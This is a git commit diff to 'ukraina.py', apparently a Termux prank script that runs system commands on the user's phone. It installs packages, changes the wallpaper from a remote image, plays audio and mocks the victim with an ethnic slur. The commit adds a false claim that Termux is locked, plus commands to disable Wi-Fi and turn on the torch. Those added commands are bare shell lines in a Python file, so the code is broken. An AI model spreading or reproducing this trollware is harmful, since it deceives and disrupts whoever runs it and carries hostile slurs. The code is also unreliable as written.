35ad0947f99a5e7129689b9f931971c8d8f35e34
screaze <91967355+screaze@users.noreply.github.com>
2021-10-05 22:00:25 +0300

    Update ukraina.py

--- ukraina.py
+++ ukraina.py
@@ -2,7 +2,13 @@ import os
 os.system('clear')
 os.system('pkg install mpv')
 os.system('apt install termux-api')
+os.system("clear")
 print("Заскамили москаля")
 os.system('termux-wallpaper -u https://i.pinimg.com/736x/5d/03/48/5d034835ae769491ae25b4745069cdd9.jpg')
 os.system('termux-toast "Слава Украине!"')
 os.system('mpv 1462a1b7ae0a.mp3')
+print("Термукс заблокирован, Wi-Fi отключён, фонарик включён, пока.")
+termux-wifi-enable false
+termux-torch true
+termux-toast "Заскамлен нахуй)"
+termux-tts-speak
